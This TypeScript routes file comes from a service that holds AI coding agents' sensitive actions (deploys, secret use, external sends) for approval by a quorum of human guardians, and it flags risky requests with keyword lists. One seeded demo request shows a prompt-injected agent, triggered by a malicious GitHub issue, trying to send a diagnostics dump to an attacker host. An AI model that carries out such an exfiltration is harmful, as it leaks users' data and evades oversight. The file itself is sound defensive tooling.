import type { FastifyInstance } from 'fastify';
import type { Db } from '../db.js';
import type { QuorumEngine } from '../quorum/QuorumEngine.js';
import type { TideAdapter } from '../tide/TideAdapter.js';
import { ulid } from 'ulid';
import { canonicalParamsHash } from '../crypto/canonicalParamsHash.js';
import {
  CreateActionRequestBodySchema,
  ListActionsQuerySchema,
  RISK_SIGNALS,
  type ActionRequest,
  type RiskSignal,
} from '@key-holder/shared';

// TODO(P1): Replace with real guardian role check once TideAdapter is verified.
// TODO(P2): Seed 3 requests on startup in dev/mock mode.

interface RoutesOptions {
  db: Db;
  quorumEngine: QuorumEngine;
  tideAdapter: TideAdapter;
}

export async function actionsRoutes(app: FastifyInstance, opts: RoutesOptions) {
  const { db } = opts;

  // Seed default demo requests on startup if DB is clean
  if (process.env.SEED_ACTIONS !== 'false') {
    seedDefaultActions(db);
  }

  /** POST /actions — create a new Action Request */
  app.post('/actions', async (request, reply) => {
    const parseResult = CreateActionRequestBodySchema.safeParse(request.body);
    if (!parseResult.success) {
      return reply.status(400).send({
        error: { code: 'VALIDATION_ERROR', message: parseResult.error.message },
      });
    }
    const body = parseResult.data;

    const id = ulid();
    const parametersHash = canonicalParamsHash(body.parameters as Record<string, unknown>);
    const now = new Date();
    const ttlSeconds = parseInt(process.env.ACTION_TTL_SECONDS ?? '3600', 10);
    const expiresAt = new Date(now.getTime() + ttlSeconds * 1000);

    // Deterministic risk signals
    const riskSignals: RiskSignal[] = computeRiskSignals(body);

    const actionRequest: ActionRequest = {
      id,
      tool: body.tool,
      parameters: body.parameters as Record<string, unknown>,
      parametersHash,
      proposer: body.proposer,
      source: body.source,
      riskSignals,
      createdAt: now.toISOString(),
      expiresAt: expiresAt.toISOString(),
      status: 'pending',
      approvals: [],
      requiredApprovals: parseInt(process.env.QUORUM_REQUIRED ?? '2', 10),
      totalGuardians: parseInt(process.env.QUORUM_TOTAL ?? '3', 10),
    };

    // Persist
    db.prepare(
      `
      INSERT INTO action_requests
        (id, tool, parameters, parameters_hash, proposer, source, risk_signals,
         created_at, expires_at, status, approvals, required_approvals, total_guardians)
      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)
    `
    ).run(
      actionRequest.id,
      actionRequest.tool,
      JSON.stringify(actionRequest.parameters),
      actionRequest.parametersHash,
      JSON.stringify(actionRequest.proposer),
      JSON.stringify(actionRequest.source),
      JSON.stringify(actionRequest.riskSignals),
      actionRequest.createdAt,
      actionRequest.expiresAt,
      actionRequest.status,
      JSON.stringify(actionRequest.approvals),
      actionRequest.requiredApprovals,
      actionRequest.totalGuardians
    );

    // Audit
    appendAudit(db, id, 'created', body.proposer.userId, { parametersHash });

    return reply.status(201).send({
      id,
      status: 'pending',
      parametersHash,
      expiresAt: expiresAt.toISOString(),
      requiredApprovals: actionRequest.requiredApprovals,
      totalGuardians: actionRequest.totalGuardians,
    });
  });

  /** GET /actions — list requests */
  app.get('/actions', async (request, reply) => {
    const queryResult = ListActionsQuerySchema.safeParse(request.query);
    if (!queryResult.success) {
      return reply.status(400).send({
        error: { code: 'VALIDATION_ERROR', message: queryResult.error.message },
      });
    }
    const { status, limit, offset } = queryResult.data;

    const rows = status
      ? db
          .prepare('SELECT * FROM action_requests WHERE status = ? LIMIT ? OFFSET ?')
          .all(status, limit, offset)
      : db.prepare('SELECT * FROM action_requests LIMIT ? OFFSET ?').all(limit, offset);

    const total = status
      ? (
          db.prepare('SELECT COUNT(*) as c FROM action_requests WHERE status = ?').get(status) as {
            c: number;
          }
        ).c
      : (db.prepare('SELECT COUNT(*) as c FROM action_requests').get() as { c: number }).c;

    return reply.send({ items: rows.map(deserialize), total, limit, offset });
  });

  /** GET /actions/:id — single request */
  app.get('/actions/:id', async (request, reply) => {
    const { id } = request.params as { id: string };
    const row = db.prepare('SELECT * FROM action_requests WHERE id = ?').get(id);
    if (!row)
      return reply
        .status(404)
        .send({ error: { code: 'NOT_FOUND', message: 'Action request not found' } });
    return reply.send(deserialize(row as Record<string, unknown>));
  });
}

// ── Helpers ───────────────────────────────────────────────────────────────────

function computeRiskSignals(body: { tool: string; parameters: unknown }): RiskSignal[] {
  const signals: RiskSignal[] = [];
  const params = (body.parameters ?? {}) as Record<string, unknown>;

  if (body.tool === 'request_send_external') {
    const dest = String(params.destination ?? '');
    try {
      const url = new URL(dest);
      const isLocal = ['localhost', '127.0.0.1'].includes(url.hostname);
      const ALLOWLIST = (process.env.DESTINATION_ALLOWLIST ?? '').split(',').filter(Boolean);
      if (!isLocal && (ALLOWLIST.length === 0 || !ALLOWLIST.includes(url.hostname))) {
        signals.push('external-domain');
      }
      signals.push('unknown-destination');
    } catch {
      signals.push('external-domain');
    }

    const payloadRef = String(params.payload_ref ?? '').toLowerCase();
    if (
      ['dump', 'all', 'backup', 'archive', 'secrets', 'leak'].some((k) => payloadRef.includes(k))
    ) {
      signals.push('unusual-volume');
    }
  }

  if (body.tool === 'request_use_secret') {
    const name = String(params.secret_name ?? '');
    const SENSITIVE_PATTERNS = [
      'PROD',
      'API_KEY',
      'SECRET',
      'PASSWORD',
      'TOKEN',
      'KEY',
      'DATABASE',
      'AWS',
      'STRIPE',
    ];
    if (SENSITIVE_PATTERNS.some((p) => name.toUpperCase().includes(p))) {
      signals.push('sensitive-tag');
    }
  }

  if (body.tool === 'request_deploy') {
    const version = String(params.version ?? '');
    if (version.includes('beta') || version.includes('nightly') || version.includes('dirty')) {
      signals.push('unusual-volume');
    }
  }

  void RISK_SIGNALS;
  return Array.from(new Set(signals));
}

export function seedDefaultActions(db: Db) {
  const countRow = db.prepare('SELECT COUNT(*) as c FROM action_requests').get() as
    { c: number } | undefined;
  if (countRow && countRow.c > 0) return;

  const now = new Date();
  const sampleActions: ActionRequest[] = [
    {
      id: '01HV8G7N9B3W00000000000001',
      tool: 'request_deploy',
      parameters: { version: '1.4.2', commit: 'c0ffee1b4d89a234' },
      parametersHash: canonicalParamsHash({ version: '1.4.2', commit: 'c0ffee1b4d89a234' }),
      proposer: { userId: 'engineer-alice', agent: 'Claude-Code-Agent-v1' },
      source: { kind: 'github-pr', reference: 'https://github.com/org/sample-repo/pull/42' },
      riskSignals: [],
      createdAt: new Date(now.getTime() - 15 * 60 * 1000).toISOString(),
      expiresAt: new Date(now.getTime() + 45 * 60 * 1000).toISOString(),
      status: 'pending',
      approvals: [
        {
          guardianId: 'guardian-alice',
          decision: 'approve',
          at: new Date(now.getTime() - 5 * 60 * 1000).toISOString(),
          parametersHash: canonicalParamsHash({ version: '1.4.2', commit: 'c0ffee1b4d89a234' }),
        },
      ],
      requiredApprovals: 2,
      totalGuardians: 3,
    },
    {
      id: '01HV8G7N9B3W00000000000002',
      tool: 'request_use_secret',
      parameters: {
        secret_name: 'PROD_DB_MIGRATION_TOKEN',
        purpose: 'Run post-deploy migration for schema v42',
      },
      parametersHash: canonicalParamsHash({
        secret_name: 'PROD_DB_MIGRATION_TOKEN',
        purpose: 'Run post-deploy migration for schema v42',
      }),
      proposer: { userId: 'guardian-alice', agent: 'Cursor-Agent' },
      source: { kind: 'direct', reference: 'slack-incident-thread-99' },
      riskSignals: ['sensitive-tag'],
      createdAt: new Date(now.getTime() - 20 * 60 * 1000).toISOString(),
      expiresAt: new Date(now.getTime() + 40 * 60 * 1000).toISOString(),
      status: 'pending',
      approvals: [],
      requiredApprovals: 2,
      totalGuardians: 3,
    },
    {
      id: '01HV8G7N9B3W00000000000003',
      tool: 'request_send_external',
      parameters: {
        destination: 'http://evil.attacker-controlled-site.org/collect',
        payload_ref: 'diagnostics_dump',
      },
      parametersHash: canonicalParamsHash({
        destination: 'http://evil.attacker-controlled-site.org/collect',
        payload_ref: 'diagnostics_dump',
      }),
      proposer: { userId: 'injected-agent', agent: 'Claude-Code-Agent-v1' },
      source: { kind: 'github-issue', reference: 'mock-env/fixtures/malicious-issue.md' },
      riskSignals: ['external-domain', 'unknown-destination', 'unusual-volume'],
      createdAt: new Date(now.getTime() - 4 * 60 * 1000).toISOString(),
      expiresAt: new Date(now.getTime() + 56 * 60 * 1000).toISOString(),
      status: 'pending',
      approvals: [],
      requiredApprovals: 2,
      totalGuardians: 3,
    },
  ];

  for (const act of sampleActions) {
    db.prepare(
      `
      INSERT INTO action_requests
        (id, tool, parameters, parameters_hash, proposer, source, risk_signals,
         created_at, expires_at, status, approvals, required_approvals, total_guardians)
      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)
    `
    ).run(
      act.id,
      act.tool,
      JSON.stringify(act.parameters),
      act.parametersHash,
      JSON.stringify(act.proposer),
      JSON.stringify(act.source),
      JSON.stringify(act.riskSignals),
      act.createdAt,
      act.expiresAt,
      act.status,
      JSON.stringify(act.approvals),
      act.requiredApprovals,
      act.totalGuardians
    );
    appendAudit(db, act.id, 'created', act.proposer.userId, { parametersHash: act.parametersHash });
  }
}

export function appendAudit(
  db: Db,
  actionRequestId: string,
  event: string,
  actor: string,
  detail: Record<string, unknown>
) {
  db.prepare(
    'INSERT INTO audit_events (id, action_request_id, event, actor, at, detail) VALUES (?,?,?,?,?,?)'
  ).run(ulid(), actionRequestId, event, actor, new Date().toISOString(), JSON.stringify(detail));
}

export function deserialize(row: Record<string, unknown>): ActionRequest {
  return {
    id: row.id as string,
    tool: row.tool as ActionRequest['tool'],
    parameters: JSON.parse(row.parameters as string) as Record<string, unknown>,
    parametersHash: row.parameters_hash as string,
    proposer: JSON.parse(row.proposer as string) as ActionRequest['proposer'],
    source: JSON.parse(row.source as string) as ActionRequest['source'],
    riskSignals: JSON.parse(row.risk_signals as string) as ActionRequest['riskSignals'],
    createdAt: row.created_at as string,
    expiresAt: row.expires_at as string,
    status: row.status as ActionRequest['status'],
    approvals: JSON.parse(row.approvals as string) as ActionRequest['approvals'],
    requiredApprovals: row.required_approvals as number,
    totalGuardians: row.total_guardians as number,
  };
}
